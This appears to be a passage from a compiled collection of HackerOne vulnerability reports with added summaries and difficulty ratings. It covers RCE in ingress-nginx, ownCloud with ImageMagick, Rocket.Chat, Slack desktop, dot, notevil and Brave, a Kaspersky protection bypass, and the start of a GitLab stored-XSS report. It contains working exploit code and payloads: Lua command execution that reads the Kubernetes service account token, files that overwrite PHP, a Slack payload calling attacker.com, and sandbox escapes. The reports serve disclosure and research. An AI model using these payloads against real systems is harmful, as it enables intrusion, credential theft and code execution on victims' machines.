Exploitation Difficulty:
The attack involves multiple components (ingress configurations, nginx.conf manipulation, file inclusion) and requires understanding of nginx configuration syntax and Kubernetes ingress behavior. The interaction between writing a file and then including it for RCE is non-obvious and requires precise manipulation of application states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1728174: Ingress nginx annotation injection causes arbitrary command execution
================================================================================
RAW DESCRIPTION:

Report Submission Form
Summary:
[add a summary of the vulnerability]
For CVE-2021-25742 and CVE-2021-25746, I found a bypass method, which is fatal to the current measures taken by the team
I can easily bypass restrictions and execute arbitrary commands in the express nginx container.
## Kubernetes Version:
[add Kubernetes version & distribution in which the issue was found]
Server Version: version.Info{Major:"1", Minor:"25", GitVersion:"v1.25.2", GitCommit:"5835544ca568b757a8ecae5c153f317e5736700e", GitTreeState:"clean", BuildDate:"2022-09-21T14:27:13Z", GoVersion:"go1.19.1", Compiler:"gc", Platform:"linux/arm64"}
Component Version:
[if applicable, add component version the issue was found]
ingress-nginx/controller-v1.4.0
https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml
Steps To Reproduce:
[add details for how we can reproduce the issue, including relevant cluster setup and configuration]
In the latest version (1.4.0), alias was blacklisted,However, nginx supports lua. I can use other watches to insert any location configuration items.
It is meaningless to simply restrict alias instructions. Your team should start from multiple perspectives.
minikube start
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml

We use nginx. ingress. kubernetes The io/configuration snippet annotation can be found in nginx Insert a new location in conf and execute any command through lua.
Code 795 Bytes
1cat > su.yml<<EOF
2apiVersion: networking.k8s.io/v1
3kind: Ingress
4metadata:
5  name: ingress-exploit
6  annotations:
7    kubernetes.io/ingress.class: "nginx"
8    nginx.ingress.kubernetes.io/configuration-snippet: |
9      more_set_headers "suanve"
10            proxy_pass http://upstream_balancer;
11                                proxy_redirect                          off;
12        }
13        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
14spec:
15  rules:
16  - host: suanve.susec.me
17    http:
18      paths:
19      - path: /
20        pathType: Prefix
21        backend:
22          service:
23            name: exploit
24            port:
25              number: 80
26
27EOF
28
29kubectl apply -f su.yml
This will cause the nginx configuration to be tampered with. We can execute any command in the corresponding ingress.
Code 476 Bytes
1curl -v -H 'Host: suanve.susec.me' -H "cmd: id" 127.0.0.1/suanve/
2*   Trying 127.0.0.1:80...
3* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
4> GET /suanve/ HTTP/1.1
5> Host: suanve.susec.me
6> User-Agent: curl/7.79.1
7> Accept: */*
8> cmd: id
9>
10* Mark bundle as not supporting multiuse
11< HTTP/1.1 200 OK
12< Date: Mon, 10 Oct 2022 09:58:18 GMT
13< Content-Type: text/html
14< Transfer-Encoding: chunked
15< Connection: keep-alive
16<
17uid=101(www-data) gid=82(www-data) groups=82(www-data)
Connection #0 to host 127.0.0.1 left intact
Code 516 Bytes
1GET /suanve/ HTTP/1.1
2Host: suanve.susec.me
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
5Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6Accept-Encoding: gzip, deflate
7Connection: close
8Upgrade-Insecure-Requests: 1
9cmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token
10X-Originating-IP: 127.0.0.1
11X-Remote-IP: 127.0.0.1
12Content-Length: 2
13
14
15
Supporting Material/References:
<image_0>
<image_1>
[attachment / reference]
https://hackerone.com/reports/1378175
https://github.com/kubernetes/ingress-nginx/issues/8503
Impact
Arbitrary command execution
Get kubernetes credentials



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to bypass security restrictions in the ingress-nginx controller by injecting malicious Lua code through the configuration-snippet annotation. This leads to arbitrary command execution within the nginx container, potentially compromising the Kubernetes cluster.

Steps to Reproduce:
1. Set up a Kubernetes cluster with ingress-nginx controller version 1.4.0.
2. Create an Ingress resource with a malicious configuration-snippet annotation that injects Lua code to execute arbitrary commands.
3. Apply the Ingress resource to the cluster using kubectl.
4. Send a crafted HTTP request to the Ingress endpoint with a command in the headers to execute arbitrary commands in the nginx container.
Exploitation Difficulty:
The attack requires knowledge of Kubernetes Ingress resources, nginx configuration, and Lua scripting. The bypass of security measures is non-obvious and involves manipulating the nginx configuration in a subtle way.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1838674: Remote Code Execution on ownCloud instances with ImageMagick installed
================================================================================
RAW DESCRIPTION:

It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using OC\Preview\Bitmap)
The prerequisite for exploitation seem to be:
ImageMagick is installed (e.g. as described in the ownCloud documentation)
The attacker knows the file path of a file that they uploaded (e.g. /mnt/data/files/)
The attacker is able to upload files to the system (e.g. by using File Drop Folders or having an account)
To reproduce we have provided the following files:
Dockerfile (F2127559)
Code 79 Bytes
1FROM owncloud/server:10.11
2RUN apt-get update && apt-get install -y imagemagick
exploit.msl (F2127558)
Code 313 Bytes
1<?xml version="1.0" encoding="UTF-8"?>
2<image> 
3  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
4  <get width="base-width" height="base-height" />
5  <resize geometry="400x400" />
6  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
7  <write filename="/var/www/owncloud/index.php" />
8</image>
image.rgb (F2127557)
Code 217 Bytes
1<svg width="1000" height="1000" 
2xmlns:xlink="http://www.w3.org/1999/xlink">
3xmlns="http://www.w3.org/2000/svg">       
4<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
5</svg>
Download these files and then perform the following steps:
Build the docker image
docker build . -t owncloud-imagemagick
docker build . -t owncloud-imagemagick
Start the docker image
docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest
docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest
Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.
Upload the file exploit.msl
Upload the file image.rgb
Upload the file exploit.msl
Upload the file image.rgb
Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)
<image_0>
Impact
Attackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.



================================================================================
Vulnerability Description:
A remote code execution vulnerability exists in ownCloud instances with ImageMagick installed. Attackers can exploit this by uploading specially crafted files (MSL and SVG) that trigger ImageMagick to overwrite PHP files with malicious code when generating previews.

Steps to Reproduce:
1. Build the docker image with ImageMagick installed: `docker build . -t owncloud-imagemagick`
2. Start the docker container: `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
3. Log in to the ownCloud instance at localhost:8080 using username 'admin' and password 'admin'
4. Upload the files `exploit.msl` and `image.rgb` to the ownCloud instance
5. Reload the page to trigger the exploit, which rewrites `index.php` with arbitrary PHP code
Exploitation Difficulty:
This vulnerability requires understanding of multiple components (ImageMagick's MSL format, SVG file handling, and ownCloud's preview generation) and their subtle interaction. The attack chain is non-obvious, involving file uploads triggering a server-side image processing vulnerability that leads to file writes.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/276031: Remote Code Execution in Rocket.Chat Desktop
================================================================================
RAW DESCRIPTION:

Summary: The Markdown parser can be tricked into allowing arbitrary Javascript leading to "remote code execution".
Description:
By combining the "link" and inline code block we can trick the parser into breaking out of the current HTML attribute.
This allows us to control other attributes of the tag and trigger javascript events.
Code 94 Bytes
1[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
becomes
Code 159 Bytes
1<a href="&lt;a href=" http:="" hax="" onmouseover="location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;" target="_blank" rel="noopener noreferrer">
This is a simple redirect to: https://maustin.net/hax/rocket/hack.html
From this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because:
"open 'file://localhost/Volumes/Macintosh HD/foo.txt'" opens the document
in the default application for its type (as determined by LaunchSer-
vices).
Note: For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)
In https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href);
Normally preload javascript is an "isolated scope" in this case however the code is directly attached to the user controlled DOM as the "window.onload" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\/\/ check send our application path to openExternal.
Code 793 Bytes
1<!DOCTYPE html>
2<html>
3    <head>
4      <script>
5        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
6          apply: function(target, thisArg, argumentsList) {
7            console.log(thisArg.source);
8          console.log(argumentsList[0]);
9          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
10            return false;
11          }
12          return Reflect.apply(target, thisArg, argumentsList)
13          }
14        });
15        setTimeout(()=>{
16            a = document.createElement("A")
17            a.href="file:///Applications/Calculator.app"
18            document.body.appendChild(a)
19            a.click()
20        }, 3000);
21      </script>
22    </head>
23    <body>
24     <h1>3...2...1...🚀</h1>
25    </body>
26</html>
Releases Affected:
= 2.9.0
Steps To Reproduce (from initial installation to vulnerability):
Create a new channel to test in.
Send the following snippet of markdown:
Code 94 Bytes
1[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
Move your mouse over the link you just send and
Supporting Material/References:
https://youtu.be/HPlwlc2J-LQ
Suggested mitigation
The markdown parser needs a little love to prevent the initial xss.
I believe you should be able to use something like window.addEventListener("load", .. to execute the checks in the proper scope.



================================================================================
Vulnerability Description:
The vulnerability involves a chain of exploits starting with a Markdown parser flaw that allows XSS, leading to remote code execution by manipulating the application's link handling mechanism to execute arbitrary applications via shell.openExternal.

Steps to Reproduce:
1. Create a new channel in Rocket.Chat
2. Send the following markdown snippet in the channel: [ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
3. Move mouse over the link to trigger the redirect to the malicious page
4. The malicious page then overrides RegExp.prototype.test to bypass security checks and executes shell.openExternal with a controlled file path
Exploitation Difficulty:
This attack requires deep understanding of multiple components: Markdown parsing quirks, DOM manipulation, JavaScript prototype pollution, and the specific implementation of Rocket.Chat's link handling. The interaction between these components is non-obvious and requires precise manipulation of application state.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/390929: Code Injection Vulnerability in dot Package
================================================================================
RAW DESCRIPTION:

I would like to report a code injection vulnerability in dot.
It allows attackers to execute arbitrary JS code, especially when combined with a prototype pollution attack.
Module
module name: dot
version: 1.1.2
npm page: https://www.npmjs.com/package/dot
Module Description
Created in search of the fastest and concise JavaScript templating function with emphasis on performance under V8 and nodejs. It shows great performance for both nodejs and browsers.
doT.js is fast, small and has no dependencies.
Module Stats
76,838 downloads in the last week
Vulnerability
Vulnerability Description
dot uses Function() to compile templates. this can be exploited by the attacker if she can control the template or if she can control the value set on Object.prototype.
Steps To Reproduce:
a) The basic attack vector
Code 131 Bytes
1var doT = require("dot");
2var tempFn = doT.template("<h1>Here is a sample template " +
3    "{{=console.log(23)}}</h1>");
4tempFn({})
b) in combination with a prototype pollution attack
create a folder "resources" and inside that a file called "mytemplate.dot" with the following content:
Code 34 Bytes
1<h1>Here is a sample template</h1>
in the folder containing the resources folder, create and execute the following js file
Code 267 Bytes
1var doT = require("dot");
2// prototype pollution attack vector
3Object.prototype.templateSettings = {varname:"a,b,c,d,x=console.log(25)"};
4// benign looking template compilation + application
5var dots = require("dot").process({path: "./resources"});
6dots.mytemplate();
Even though the template compilation + application looks safe, due to the prototype pollution, the attacker can execute arbitrary commands.
Patch
N/A remove Function() call
Wrap up
I contacted the maintainer to let them know: N
I opened an issue in the related repository: N
Impact
The attacker can achieve code injection/RCE if she can control the template or if she can set arbitrary properties on Object.prototype. Using Function() with runtime computed values is rarely safe.



================================================================================
Vulnerability Description:
The vulnerability in the dot package allows for code injection through template compilation using Function(), which can be exploited to execute arbitrary JavaScript code. This is particularly dangerous when combined with prototype pollution, as it can lead to remote code execution.

Steps to Reproduce:
1. var doT = require("dot");
2. var tempFn = doT.template("<h1>Here is a sample template " + "{{=console.log(23)}}</h1>");
3. tempFn({})
Exploitation Difficulty:
The attack involves understanding the template compilation process in the dot package and how prototype pollution can be leveraged to inject malicious code. The interaction between these components is non-obvious and requires knowledge of JavaScript's prototype chain and the specific implementation details of the dot package.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/415178: chrome://brave can still be navigated to, leading to RCE
================================================================================
RAW DESCRIPTION:

Summary:
'chrome://brave' can be navigated to using the middle mouse click (or normal click with CTRL held) IFF coming from a bookmark. I am also using a small bug to actually trick a user into bookmarking our crafted URL through drag and drop.
Products affected:
Brave: 0.24.0
V8: 6.9.427.23
rev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c
Muon: 8.1.6
OS Release: 10.0.17134
Update Channel: Release
OS Architecture: x64
OS Platform: Microsoft Windows
Node.js: 7.9.0
Brave Sync: v1.4.2
libchromiumcontent: 69.0.3497.100
Steps To Reproduce:
Host attached PoC in any web
Once opened, you will be instructed to save the html file locally and open it this way
Open the saved PoC from local disk
Click anywhere to open a popup
Drag the anchor tag into the main window bookmark bar (if you never bookmarked anything then just right click and bookmark)
Hold CTRL and click on the new bookmark, or right click and press "open in new tab"
Impact
Navigating to chrome://brave is a bad thing since it can lead to RCE ( https://hackerone.com/reports/395737 )
We can also use another bug I filed ( https://hackerone.com/reports/415167 ) which can detect local files. If there is a way to drop HTML files into the local disk (cache or some other possibility) we can then try to use bug 415167 to bypass having to know OS username and any potentially salted folders. If this is achievable we can skip the part where we need to download and open PoC locally.
It would go something like:
Open PoC from web
PoC will somehow drop HTML in local disk (I have heard in other reports of possible local file XSS)
Using bug 415167 we try to guess OS username + folder path to dropped HTML file
Use the bookmark trick as described above.
Instruct user to open bookmark with either method described above.



================================================================================
Vulnerability Description:
The vulnerability allows navigation to 'chrome://brave' via a crafted bookmark, which can lead to Remote Code Execution (RCE). The attack involves tricking a user into bookmarking a malicious URL and then exploiting the browser's handling of 'chrome://' URLs.

Steps to Reproduce:
1. Host the provided PoC HTML file on a web server.
2. Instruct the user to save the HTML file locally and open it.
3. Once opened, the user clicks anywhere to trigger a popup.
4. The user drags the anchor tag from the popup to the bookmark bar.
5. The user holds CTRL and clicks the bookmark or right-clicks and selects 'Open in new tab'.
Exploitation Difficulty:
The attack involves multiple components including user interaction (bookmarking), browser behavior (handling of 'chrome://' URLs), and potential RCE. The subtle interaction between these components and the need to manipulate the user into performing specific actions increases the complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/783877: Remote Code Execution in Slack desktop apps + bonus
================================================================================
RAW DESCRIPTION:

Summary
With any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps. This report demonstrates a specifically crafted exploit consisting of an HTML injection, security control bypass and a RCE Javascript payload. This exploit was tested as working on the latest Slack for desktop (4.2, 4.3.2) versions (Mac/Windows/Linux).
To demonstrate the impact of this RCE vulnerability and how it could be used in various scenarios, a new approach was developed for the starting point (HTML injection & payload) as vulnerabilities reported previously cannot be used anymore #738229.
Finally, as an added bonus, a XSS vulnerability on https://files.slack.com is demonstrated as a possible RCE payload store. I chose to not report this separately as it seems the domain is out of scope (?), however the vulnerability in my opinion is critical by itself and should be fixed either way.
Technical description and steps of reproduction
Exploitation steps:
Upload file on your HTTPS enabled server with the RCE payload
Prepare a Slack Post with HTML injection
Share Post with channel or user
User steps:
click on a large post with an enticing image - code executed on PC
Actual path after user click:
HTML redirects user's desktop app to attacker website in _top frame
Attacker website replies with RCE javascript
exploit bypasses Slack desktop app env, leaks an Electron object and via it executes arbitrary commands on user's PC.
NOTE: This could also be done with any XSS/in-app redirect vulnerability.
HTML injection - directly editing Slack Post structure as JSON
### 1. create a new Slack Post with some title and some content
When you create a new Slack Post, it creates a new file on https://files.slack.com with the following JSON structure:
Code 54 Bytes
1{"full":"<p>content<\/p>","preview":"<p>content<\/p>"}
<image_0>
<image_1>
The private file URL is in the format https://files.slack.com/files-pri/{TEAM_ID}-{FILE_ID}/TITLE under url_private response from /api/files.info. The Slack Post JSON structure can be observed by simply visiting the private file link.
### 2. Injecting HTML payload
It's possible to directly edit this JSON structure, which can contain arbitrary HTML. Javascript execution is restricted by CSP and various security protections are in place for HTML tags (i.e. banned iframe, applet, meta, script, form etc. and target attribute is overwritten to _blank for A tags).
However, it is still possible to inject area and map tags, which can be used to achieve a one-click-RCE.
To edit the JSON structure directly and inject in that way, you can use the web UI provided by Slack itself:
Code 82 Bytes
1https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit
YOUR-MEMBER-ID you can copy from your profile view, it's in the format UXXXXXXXX
<image_2>
Alternatively, it's possible to upload a Javascript/JSON snippet and change it's filetype to docs by editing the filetype parameter with a HTTP proxy.
<image_3>
<image_4>
Since no HTML embedding is possible and various interesting tags are restricted + Javascript is not available because of existing protections and a defined CSP, a new HTML injection payload was developed:
Code 292 Bytes
1<img src="https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png" width="10000" height="10000" usemap="#slack-img">
2<map name="slack-img">
3<area shape="rect" coords="10000,10000 0,0" href="https://attacker.com/t.html" target="_self">
4</map>
Note this payload requires an image to reference with the attribute usemap. This can be hosted in Slack infrastructure by uploading an image to Slack beforehand.
JSON to provide for Slack Post edit @ https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit payload.json:
Code 343 Bytes
1{
2  "full": "asd",
3  "preview": "<img src=\"https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png\" width=\"10000\" height=\"10000\" usemap=\"#slack-img\"><map name=\"slack-img\"><area shape=\"rect\" coords=\"10000,10000 0,0\" href=\"https://attacker.com/t.html\" target=\"_self\"></map>"
4}
### 3. RCE exploit code - hosted on attacker's website
the URL link within the area tag would contain this HTML / JS exploit for Slack Desktop apps which executes any attacker provided command:
Code 646 Bytes
1<html>
2<body>
3<script>
4  // overwrite functions to get a BrowserWindow object:
5  window.desktop.delegate = {}
6  window.desktop.delegate.canOpenURLInWindow = () => true
7  window.desktop.window = {}
8  window.desktop.window.open = () => 1
9  bw = window.open('about:blank') // leak BrowserWindow class
10  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
11  nbw.loadURL('about:blank') // need to load some URL for interaction
12  nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")') // exec command
13</script>
14</body>
15</html>
For windows just replace open /Applications/Calculator.app with calc or anything else.
To test the RCE payload, you can open Developer Tools on any Slack Desktop app and paste only the Javascript code in console. It achieves RCE and illustrates that it's independent of any entry point - i.e. redirect within the desktop app.
### 4. easy access to all private data without command execution
The payload can be easily modified to access all private conversations, files, tokens etc. without executing commands on the user's computer:
Code 519 Bytes
1<html>
2<body>
3<script>
4  window.desktop.delegate = {}
5  window.desktop.delegate.canOpenURLInWindow = () => true
6  window.desktop.window = {}
7  window.desktop.window.open = () => 1
8  bw = window.open('about:blank')
9  nbw = new bw.constructor({show: false}) // node not necessary for this demo
10  nbw.loadURL('https://app.slack.com/robots.txt') // robots.txt for speed, app.slack.com gives us the user's full environment 
11  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
12</script>
13</body>
14</html>
<image_5>
Essentially, this gives an attacker full remote control over the Slack desktop app via overwriting Slack desktop app env functions and providing a "tunnel" via BrowserWindow to execute arbitrary Javascript, i.e. a weird XSS case with full access to anything the Slack app has - easy access to private channels, conversations, functions etc.
files.slack.com - alternate payload store and an XSS in itself
During search for an entry point for the RCE exploit, it was discovered that emails (when sent as plaintext) are stored unfiltered on Slack servers at https://files.slack.com and with direct access returned as text/html, without force-download.
This HTML file upload functionality can be used for storing the RCE payload - no need to use own hosting.
<image_6>
Since it's a trusted domain, it could contain a phishing page with a fake Slack login page or different arbitrary content which could impact both security and reputation of Slack. There are no security headers or any restrictions at all as far as I could tell and I'm sure some other security impact could be demonstrated with enough time.
<image_7>
How to upload html to files.slack.com
Any email client can be used, i.e. in macOS's default client you can press CMD+SHIFT+T to make an email plaintext, copy paste the RCE payload from above and embed it in your Slack Post HTML injection.
<image_8>
As the "Send To Slack" email address, you have to use your custom email integration address or private email address - instructions. Scroll to "Send one email at a time into Slack with forwarding address" for easy setup - no app integration or installs necessary.
The uploaded HTML file can then be found via the UI "open original" or by the same /api/files.info API call on e-mail file id and then visiting the url_private link.
TL;DR
HTML injection path via web UI - direct editing of Post file structure
alternatively HTML injection via file conversion from Javascript/JSON to docs - achieves same goal of editing Post structure directly
new pure HTML payload to redirect Slack Desktop app
new OS-agnostic Remote Code Execution payload - requires any kind of in-app redirect to a malicious page
XSS in files.slack.com without restriction via e-mail
all files of course must be shared with the recipients via the usual methods otherwise private files are inaccessible
Impact
Remote Code Execution in Slack desktop apps:
access to private files, private keys, passwords, secrets, internal network access etc.
access to private conversations, files etc. within Slack
payload could be made "wormable" - re-post to all user workspaces after click
XSS in files.slack.com
arbitrary HTML content in *.slack.com - trusted page
phishing with fake HTML login page
can be used to store above RCE exploit



================================================================================
Vulnerability Description:
This vulnerability allows for Remote Code Execution (RCE) in Slack desktop apps through a combination of HTML injection, security control bypass, and a crafted JavaScript payload. The exploit leverages in-app redirects to execute arbitrary code, potentially giving attackers full control over the victim's Slack desktop app and access to private data.

Steps to Reproduce:
1. Create a new Slack Post with a title and content, which generates a JSON file on files.slack.com.
2. Inject HTML payload by editing the JSON structure directly via the Slack web UI or by uploading a Javascript/JSON snippet and changing its filetype to docs.
3. Share the post with a channel or user. When the user clicks on the post, the injected HTML redirects the desktop app to an attacker's website.
4. The attacker's website replies with RCE JavaScript, which bypasses Slack's desktop app environment and executes arbitrary commands on the user's PC.
Exploitation Difficulty:
The attack involves multiple complex components including HTML injection, bypassing security controls, and crafting a JavaScript payload for RCE. It requires a deep understanding of Slack's desktop app environment, Electron framework, and non-obvious interactions between these components. Additionally, the novel use of HTML area and map tags for redirection is not commonly seen in other applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/809012: [notevil] - Sandbox Escape Lead to RCE on Node.js and XSS in the Browser
================================================================================
RAW DESCRIPTION:

I would like to report a sandbox escape / code injection vulnerability in notevil.
It allows an attacker to escape the intended sandbox and execute javascript code in the global context, meaning that he/she can achieve arbitrary command execution (RCE) when running in nodejs and cross site scripting (XSS) when running in the browser.
Module
module name: notevail
version: 1.3.2
npm page: https://www.npmjs.com/package/notevil
Module Description
Evalulate javascript like the built-in javascript eval() method but safely.
This module uses esprima to parse the javascript AST then walks each node and evaluates the result.
Like built-in eval, the result of the last expression will be returned. Unlike built-in, there is no access to global objects, only the context that is passed in as the second object.
Built in types such as Object and String are still available, but they are wrapped so that any changes to prototypes are contained in the eval instance.
Module Stats
[1] weekly downloads: 3,290
Vulnerability
Vulnerability Description
A bypass to a previous sandbox escape fix (https://github.com/mmckegg/notevil/commit/5974329712f0a527c5e16d3b9067a076e28e45f1) is existing and proven by the attached poc.
Steps To Reproduce:
Node.js
Code 501 Bytes
1var safeEval = require("notevil")
2
3var code = "" +
4    "function fn() {};" +
5    "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" +
6    "var properties = Object.values(constructorProperty);" +
7    "properties.pop();" +
8    "properties.pop();" +
9    "properties.pop();" +
10    "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" +
11    "(Func())()"
12console.log(safeEval(code))
check the provided poc:
http://runkit.com/phra/notevil---sandbox-escape
Browser
If we check some dependent package, such as react-schema-form, we can see that the issue lead to XSS when the affected package is used in the browser.
visit https://networknt.github.io/react-schema-form/
set form
Code 541 Bytes
1[
2  {
3    "key": "comments",
4    "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()",
5    "type": "radios",
6    "titleMap": [
7      {
8        "value": "S",
9        "name": "Shipping"
10      },
11      {
12        "value": "P",
13        "name": "Pickup"
14      }
15    ]
16  }
17]
set schema
Code 58 Bytes
1{
2  "type": "object",
3  "required": [
4    "comments"
5  ]
6}
Patch
TBD
Supporting Material/References:
not applicable.
Wrap up
I contacted the maintainer to let them know: N
I opened an issue in the related repository: N
Impact
An attacker can execute arbitrary commands on the system when the package is used with nodejs and execute arbitrary javascript when is used in the browser.



================================================================================
Vulnerability Description:
The vulnerability is a sandbox escape in the 'notevil' package that allows an attacker to execute arbitrary JavaScript code in the global context. This leads to Remote Code Execution (RCE) in Node.js and Cross-Site Scripting (XSS) in the browser.

Steps to Reproduce:
1. Install the 'notevil' package (version 1.3.2) in a Node.js environment.
2. Execute the provided PoC code to escape the sandbox and achieve RCE or XSS.
Exploitation Difficulty:
The attack involves manipulating JavaScript prototypes and constructor properties in a non-obvious way to bypass the sandbox. It requires deep understanding of JavaScript internals and the specific implementation of the 'notevil' sandbox.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/870615: [Fixed] A vulnerability in KAVKIS 2020 products family allows full disabling of protection
================================================================================
RAW DESCRIPTION:

Note! Thank you for your report. For the purposes of the further analysis of the vulnerability, that you kindly report to us, could you please fill all fields [in square brackets]. This information will help us to respond you more quickly and triage your report. Thanks a lot for your assistance.
I use Translator, T_T Sorry
Summary
can turn off anti-virus functionality in an external process.
Description
Use the SetWindowsHookEx function to inject the DLL. The ClientLoadLibrary was hooked to prevent injection, but dlls with specific file names were injectable(tiptsf.dll). After that, I was able to hook some WinAPIs and turn off antivirus.
Environment
Scope: Application
Product name: Kaspersky Internet Security
Product version:20.0.14.1085
OS name and version (incl SP): Windows 10 RS5
Attack type: Bypass
Maximum user privileges needed to reproduce your issue: no privileges
Steps to reproduce
FindWindow and get hwnd from kaspersky internet security(avpui.exe)
I have invoked the SetWindowsHookEx function to inject the DLL.
After hooking the TrackPopupMenu function, send a pop-up message through PostMessage.
When self-protection is turned on, it generates a new avpui.exe and then generates a Dialog that asks users to confirm. the generated process also injects dll.
In the newly created avpui.exe, hook the IsDialogMessageW function and switch to a message that occurs when you click the OK button.
download ransomware & run.
Impact
The bypass function can be used to turn off the antivirus before the malware is activated.



================================================================================
Vulnerability Description:
A vulnerability in Kaspersky Internet Security 2020 allows an attacker to disable antivirus protection by injecting a DLL (tiptsf.dll) via SetWindowsHookEx, hooking critical functions (TrackPopupMenu, IsDialogMessageW), and bypassing self-protection mechanisms to simulate user confirmation.

Steps to Reproduce:
1. FindWindow and get hwnd from Kaspersky Internet Security (avpui.exe)
2. Invoke SetWindowsHookEx function to inject the DLL (tiptsf.dll)
3. Hook the TrackPopupMenu function and send a pop-up message through PostMessage
4. Hook the IsDialogMessageW function in the newly created avpui.exe to simulate clicking the OK button
5. Download and execute ransomware
Exploitation Difficulty:
The attack involves multiple non-trivial steps (DLL injection, API hooking, process manipulation) and requires understanding of Kaspersky's self-protection behavior. The need to chain hooking of different functions across processes and bypass confirmation dialogs adds complexity, though the techniques themselves are known in offensive security.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Stored Vulnerabilities (7 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1665658: Stored-XSS with CSP-bypass via labels' color
================================================================================
RAW DESCRIPTION:

Gitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS.
Step to reproduce
To reproduce, we need the following prerequisite:
Github does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server
A VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.
I created the dummy server using nodejs, so you need to have also nodejs on the machine
A Gitlab personal access token. Go here to create a new token with within api scope.
Step 1: run the dummy server
Copy the attachment file on your machine and decompress it to any folder, e.g., /tmp/dummy-server
Go to /tmp/dummy-server then run this command: node ./index.js YOUR_IP YOUR_PORT in which, you should replace IP and PORT with the one you have. For example, sudo node index.js 51.75.74.52 80
Step 2: trigger Gitlab import
Open a new terminal, then run the following command in which:
YOUR_IP and YOUR_PORT by the values in the previous step
YOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement
YOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name
YOUR_IP and YOUR_PORT by the values in the previous step
YOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement
YOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name
Code 417 Bytes
1curl -kv "https://gitlab.com/api/v4/import/github" \
2  --request POST \
3  --header "content-type: application/json" \
4  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
5  --data '{
6    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
7    "repo_id": "523303538",
8    "target_namespace": "YOUR_GITLAB_USERNAME",
9    "new_name": "xss-on-label-color",
10    "github_hostname": "http://YOUR_IP:YOUR_PORT"
11}'
For example:
Code 403 Bytes
1curl -kv "https://gitlab.com/api/v4/import/github" \
2  --request POST \
